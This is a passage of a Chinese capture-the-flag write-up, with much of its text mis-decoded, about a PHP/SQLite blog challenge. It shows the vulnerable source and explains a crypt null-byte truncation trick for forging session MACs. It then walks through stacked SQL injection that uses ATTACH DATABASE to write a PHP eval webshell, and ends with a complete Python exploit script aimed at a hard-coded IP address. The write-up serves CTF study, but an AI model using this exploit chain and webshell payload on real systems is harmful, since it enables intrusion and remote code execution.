     <span class="token keyword">return</span> <span class="token variable">$sth</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">get_user</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$user_id</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> string <span class="token punctuation">{</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"SELECT name FROM user WHERE id = {$user_id}"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$user</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token string">'me'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">insert_entry</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$user_id</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$sth</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">'INSERT INTO entry (content, user_id) VALUES (?, ?)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sth</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$user_id</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">delete_entry</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$entry_id</span><span class="token punctuation">,</span> <span class="token variable">$user_id</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"DELETE from entry WHERE {$user_id} &lt;> 0 AND id = {$entry_id}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">insert_entry</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$entries</span> <span class="token operator">=</span> <span class="token function">get_entries</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'delete'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$entries</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$entry</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'delete'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$entry</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">delete_entry</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$entry</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$entry</span><span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$entries</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$entry</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$entries</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">get_user</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$entry</span><span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token delimiter">?></span>
<span class="token markup"><span class="token doctype">&lt;!doctype html></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>My shitty Blog<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>icon<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>image/png<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/favicon.png<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>My shitty blog<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
    <span class="token delimiter">&lt;?php</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$entries</span> <span class="token keyword">as</span> <span class="token variable">$entry</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token delimiter">?></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token variable">$entry</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>small</span><span class="token punctuation">></span></span></span>By <span class="token delimiter">&lt;?</span><span class="token operator">=</span>  <span class="token variable">$entry</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token delimiter">?></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>small</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
                <span class="token markup">&lt;input type="hidden" name="delete" value="<span class="token prolog">&lt;?= $entry['id'] ?></span></span>"<span class="token operator">></span>
                <span class="token shell-comment comment"># åŠ ä¸ªuserIDå†è¯•ä¸€ä¸‹</span>
                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Delete<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span>
    <span class="token delimiter">&lt;?php</span> <span class="token keyword">endforeach</span> <span class="token delimiter">?></span>

  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span>
</code></pre>
<p>ç”¨æˆ·è¾“å…¥åªæœ‰ä¸‰ä¸ªï¼Œsessionï¼Œ$_POST[â€˜contentâ€™]ï¼Œ$_POST[â€˜deleteâ€™]ï¼Œcontentåœ¨æ’å…¥çš„æ—¶å€™è¢«prepareäº†ï¼Œæ— æ•Œé˜²å¾¡ï¼Œdeleteåªæœ‰å’Œä»æ•°æ®åº“é‡ŒæŸ¥å‡ºæ¥çš„$entry[â€˜idâ€™]ç›¸ç­‰æ—¶æ‰èƒ½è¿›è¡ŒæŸ¥è¯¢<br>è€Œ$entry[â€˜idâ€™]æ˜¯ä¸€ä¸ª<code>INTEGER PRIMARY KEY AUTOINCREMENT</code>ï¼Œå®Œå…¨ä¸å¯æ§</p>
<p>åªæœ‰sessionä¸­æœ‰ä¸€ä¸ªidå€¼ï¼Œåœ¨insertçš„æ—¶å€™è¢«prepareå®‰å…¨æ’å…¥ï¼Œä½†åœ¨get_userå’Œdelete_entryæ—¶ä»æ•°æ®åº“ä¸­å–å‡ºï¼Œå¹¶æœªåšé¢å¤–å¤„ç†ï¼Œå­˜åœ¨æ³¨å…¥</p>
<p>ä½†idéœ€è¦ä¸€ä¸ªå¯¹åº”çš„macé€šè¿‡éªŒè¯ï¼Œæ‰èƒ½è¢«æ’å…¥æ•°æ®åº“ï¼Œè€Œmacçš„ç”Ÿæˆï¼Œä¼¼ä¹éå¸¸çš„å®‰å…¨</p>
<p>æ•´ä¸ªæ ¡éªŒè¿‡ç¨‹ä¸ºè¿™æ®µä»£ç </p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string">'SECRET_PLACEHOLDER'</span><span class="token punctuation">;</span>
<span class="token variable">$salt</span> <span class="token operator">=</span> <span class="token string">'$6$'</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'$'</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">random_int</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">PHP_INT_MAX</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$mac</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">crypt</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$salt</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$session</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span> <span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token function">crypt</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$salt</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$salt</span><span class="token punctuation">.</span><span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$mac</span> <span class="token operator">=</span> <span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>å¹¶ä¸æ˜¯å¾ˆæ‡‚å¯†ç å­¦çš„æˆ‘æ„Ÿè§‰å®Œå…¨æ²¡æ³•æ‰“ï¼Œé¢˜ç›®ä¼šç»™æˆ‘ä»¬ç­¾åˆæ³•idå’Œmacï¼Œä½†åˆæ³•çš„idåªä¼šæ˜¯ä¸€ä¸ªæ•°å­—ï¼Œåšä¸åˆ°æ³¨å…¥æ•ˆæœï¼Œéœ€è¦è¿›è¡Œidçš„ä¼ªé€ </p>
<p>ä½†secretå’Œsaltå‡æœªçŸ¥ä¸”ä¸å¯æ§ï¼Œcryptä¸­çš„saltç”¨æ¥åŠ ç›ä¸”æŒ‡å®šç®—æ³•ï¼Œä¸€å¼€å§‹åœ¨æƒ³ï¼Œå¦‚æœcryptæˆ–è€…hash_hmacå‡½æ•°ä¸­æ”¯æŒåŠ å¯†æ•°æ®å­˜åœ¨æ³¨é‡Šä¹‹ç±»çš„åŠŸèƒ½å°±å¥½äº†ã€‚ã€‚ã€‚ä¸€ç•ªæœç´¢åæ— æœ</p>
<p>æœ€åæ˜¯tkmk@0opsæå‡ºäº†cryptå‡½æ•°å¯ä»¥è¢«00æˆªæ–­ã€‚å¦‚æœhash_hmacçš„ç»“æœæ˜¯\x00å¼€å¤´ï¼Œåˆ™åç»­å†…å®¹ä¼šè¢«æˆªæ–­ï¼Œç­‰äºå¯¹ç©ºå­—ç¬¦ä¸²ï¼ˆè¿˜æ˜¯è¯´00ï¼Ÿï¼‰è¿›è¡ŒåŠ å¯†ï¼Œè¿™æ ·å­å°±èƒ½ä½¿å¾—æ•´ä¸ªåŠ å¯†ç»“æœä¸å˜</p>
<p>é¦–å…ˆé€šè¿‡ç–¯ç‹‚å‘åŒ…è¿›è¡Œç¢°æ’ï¼Œåªè¦æ‹¿åˆ°ä¸¤ä¸ªmacç›¸åŒè€Œidä¸åŒçš„æ•°æ®ï¼Œå°±èƒ½è¯æ˜è¿™ä¸¤ä¸ªæ•°æ®åœ¨hashåæ˜¯ä»¥00å¼€å¤´çš„ï¼Œå°±èƒ½æ‹¿åˆ°å¯¹åº”çš„macå€¼<br>ç„¶åæ„é€ æˆ‘ä»¬è‡ªå·±çš„payloadï¼Œå¹¶åŒæ ·çš„è¿›è¡Œç¢°æ’ï¼Œä»¥æœŸå…¶hashåä»¥00å¼€å¤´ï¼Œå³å¯ä½¿ç”¨ä¹‹å‰è·å–çš„00hashè¿›è¡Œæ³¨å…¥</p>
<p>è€ŒPHPä½¿ç”¨çš„æ˜¯PDOè¿æ¥çš„sqliteï¼ŒPDOé»˜è®¤æ˜¯æ”¯æŒå †å æ³¨å…¥çš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨sqliteçš„attach databaseæ“ä½œå¯¼å‡ºä¸€ä¸ªwebshellè¿›è¡Œrce</p>
<p>ç†è®ºä¸Šæ¥è¯´åˆ°è¿™è¿™ä¸ªé¢˜å°±æ²¡ä»€ä¹ˆé—®é¢˜äº†ï¼Œç„¶è€Œæˆ‘ä¼¼ä¹æœ‰äº›è¿‡äºæ„šè ¢<br>è¿™ä¸ªé¢˜çš„dockerfileæ•´ä½“ä¸Šå’Œå…¶ä»–é¢˜çš„dockerfileç±»ä¼¼ï¼Œæƒé™è®¾ç½®æ˜¯è¿™ä¸ªæ ·å­çš„</p>
<pre class=" language-dockerfile"><code class="language-dockerfile">RUN chown -R root:root /var/www && \
    find /var/www -type d -exec chmod 555 {} \; && \
    find /var/www -type f -exec chmod 444 {} \; && \
    chown -R root:root /tmp /var/tmp /var/lib/php/sessions && \
    chmod -R 000 /tmp /var/tmp /var/lib/php/sessions && \
    mkdir -p /var/www/html/data && \
    chmod 703 /var/www/html/data && \
</code></pre>
<p>&#x2F;var&#x2F;www&#x2F;htmlæ˜¯ä¸å¯å†™çš„ï¼Œ&#x2F;var&#x2F;www&#x2F;html&#x2F;dataä»…å¯å†™å¯æ‰§è¡Œï¼Œä¸å¯è¯»ï¼Œè€Œæˆ‘ä»¬çš„sqliteæ•°æ®åº“æ˜¯åœ¨dataä¸‹æ–°å¼€çš„ç›®å½•ï¼Œå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œä½†ç›®å½•åä¸º<code>&#39;./data/&#39;.md5($salt.&#39;|&#39;.$id.&#39;|&#39;.$mac);</code>ï¼Œsaltè¿˜æ˜¯æ²¡åŠæ³•å¼„åˆ°</p>
<p>æˆ‘ä¸€åº¦è‹¦æ¼å¦‚ä½•æåˆ°è¿™ä¸ªè·¯å¾„ï¼Œå‘ç°sqliteæœ‰ä¸€ä¸ªå‘½ä»¤<code>.database</code>å¯ä»¥æ˜¾ç¤ºå½“å‰æ•°æ®åº“è·¯å¾„ï¼Œä½†è¿™ç§å‘½ä»¤ç»Ÿç§°dot commandï¼Œåªèƒ½åœ¨è¾“å…¥çš„å¼€å¤´ä½¿ç”¨ï¼Œä¸”ä¸èƒ½å¤¹æ‚åœ¨ä»»ä½•æŸ¥è¯¢è¯­å¥ä¸­ã€‚è·¯å¾„æ³„éœ²æ— æœ</p>
<p>æœ€åçš„æœ€åæˆ‘æ‰å‘ç°ï¼ŒåŸæ¥ç›®å½•å¯å†™å¯æ‰§è¡Œä½†ä¸å¯è¯»ï¼Œä½†ç›®å½•ä¸‹çš„æ–‡ä»¶å¯è¯»çš„è¯ï¼Œæ˜¯å¯ä»¥ç›´æ¥è¯»å–é‚£ä¸ªæ–‡ä»¶çš„ã€‚ã€‚ã€‚ç›®å½•çš„è¯»çš„ä½œç”¨å°±æ˜¯èƒ½è®©ä½ åˆ—ç›®å½•è€Œå·²ã€‚ã€‚ã€‚<br>æ‰€ä»¥ç›´æ¥å†™dataç›®å½•å°±å¥½äº†</p>
<p>ä¸€å¼€å§‹ä¸€ç›´åœ¨å°è¯•æ‰“get_useré‚£ä¸ªå‡½æ•°ï¼Œåªè¦æˆ‘å…ˆæäº¤ä¸€ä¸ªcontentæŠŠæˆ‘çš„æ¶æ„userIDæ’è¿›æ•°æ®åº“ï¼Œé‚£ä¹ˆæˆ‘æ¯æ¬¡getè®¿é—®çš„æ—¶å€™åº”è¯¥å°±ä¼šè‡ªåŠ¨è§¦å‘æ‰å¯¹ï¼Ÿä½†æ˜¯æˆ‘å®é™…ä¸Šè¯•äº†åŠå¤©æ²¡æˆåŠŸï¼Ÿæœ€åæ˜¯ç”¨çš„delete_entryå‡½æ•°æ‰æˆåŠŸçš„<br>ä½†æŸ¥èµ„æ–™æ˜¾ç¤ºqueryå’Œexecåº”è¯¥éƒ½æ˜¯æ”¯æŒå †å çš„ï¼ŒåŒºåˆ«åœ¨äºqueryè¿”å›ç»“æœï¼Œè€Œexecåªè¿”å›å—å½±å“çš„è¡Œæ•°<br>æ‰€ä»¥ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p>è´´ä¸€ä¸ªè„šæœ¬</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> <span class="token operator">*</span>

url <span class="token operator">=</span> <span class="token string">"http://65.108.176.96:8888/"</span>
pair <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
null <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print(pair)</span>
    session <span class="token operator">=</span> res<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span>
    sessions <span class="token operator">=</span> session<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"%7C"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> pair<span class="token punctuation">.</span>get<span class="token punctuation">(</span>sessions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> sessions<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> pair<span class="token punctuation">.</span>get<span class="token punctuation">(</span>sessions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>sessions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>sessions<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pair<span class="token punctuation">.</span>get<span class="token punctuation">(</span>sessions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            null <span class="token operator">=</span> sessions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
            <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        pair<span class="token punctuation">[</span>sessions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> sessions<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

payload <span class="token operator">=</span> quote<span class="token punctuation">(</span><span class="token string">";ATTACH DATABASE '/var/www/html/data/z33.php' AS 'test';create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('&lt;?php eval($_GET[z33]);?>');-- "</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># insert user_id</span>
i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>payload<span class="token operator">+</span><span class="token string">"%7C"</span><span class="token operator">+</span>null<span class="token punctuation">)</span>
    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"content"</span><span class="token punctuation">:</span> <span class="token string">"test"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"session"</span><span class="token punctuation">:</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>payload<span class="token operator">+</span><span class="token string">"%7C"</span><span class="token operator">+</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> len<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token keyword">break</span>

res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"delete"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"session"</span><span class="token punctuation">:</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>payload<span class="token operator">+</span><span class="token string">"%7C"</span><span class="token operator">+</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre>
